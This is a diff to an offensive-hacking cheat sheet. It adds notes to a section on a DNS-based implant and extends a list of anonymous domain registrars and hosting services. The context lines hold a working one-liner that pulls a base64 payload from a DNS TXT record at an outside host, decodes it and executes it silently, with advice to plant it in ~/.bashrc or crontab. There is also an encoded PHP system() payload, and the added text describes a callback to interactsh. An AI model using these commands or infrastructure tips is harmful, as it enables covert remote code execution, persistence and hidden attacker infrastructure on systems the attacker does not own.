@@ -1850,13 +1850,15 @@ echo -n '@system("{ id; date;}>/tmp/.b00m 2>/dev/null");' |base64 -w0
 
 - The DNS TXT payload is limited to 2,048 characters (sometimes 65,535 characters).
 - The implant is a `bootloader`. Use a while loop to download and execute larger paypload via DNS.
-- Check out our favorite places to [register a domain anonymously](#pub): 
+- Check out our favorite places to [register a domain anonymously](#pub). [Cloudflare's](https://www.cloudflare.com) Free-Tier is a good start.
 
 Can also be triggered via `~/.bashrc` or the user's crontab. Use (example):
 ```shell
 # Use a "double bash" to redirect _also_ $()-subshell error to /dev/null:
 bash -c 'exec bash -c "{ $(dig +short b00m2.team-teso.net TXT|tr -d \ \"|base64 -d);}"'&>/dev/null
 ```
+(the example payload creates `/tmp/.b00m` and notifies us via another DNS request to [interactsh](https://interactsh.com).
+
 
 <a id="ld-backdoor"></a>
 **6.vii. Local Root Backdoor**
@@ -2620,12 +2622,14 @@ Exfil<a id="cloudexfil"></a>
 
 Publishing<a id="pub"></a>
 1. [free BT/DC/eD2k seedbox](https://valdikss.org.ru/schare/)
-1. Or use /onion on [segfault.net](https://www.thc.org/segfault) or plain old https with ngrok.
+1. Or use /onion on [segfault.net](https://www.thc.org/segfault) or plain old https with ngrok
+2. [Cloudflare](https://www.cloudflare.com) - The Free-Tier allows most things (dns + domains + tunnels).
+1. [Njal.la](https://njal.la) - Privacy focused Domain Registrar
 1. [DuckDNS](https://www.duckdns.org/) - Free Domain Names
 1. [AnonDNS](https://anondns.net/) - Free Domain Name (anonymous)
 1. [afraid.org](https://www.afraid.org) - Free Dynamic DNS for your domain
-2. [hostwinds](https://hostwinds.com) - Pay with crypto
-3. [unstoppable domains](https://unstoppabledomains.com) - Pay with crypto
+1. [hostwinds](https://hostwinds.com) - Pay with crypto
+1. [unstoppable domains](https://unstoppabledomains.com) - Pay with crypto
 1. [he.net](https://dns.he.net/) - Free Nameserver service
 1. [0bin](https://0bin.net/) / [paste.ec](https://paste.ec) - Encrypted PasteBin
 1. [pad.riseup.net](https://pad.riseup.net) - Create documents and share them securely
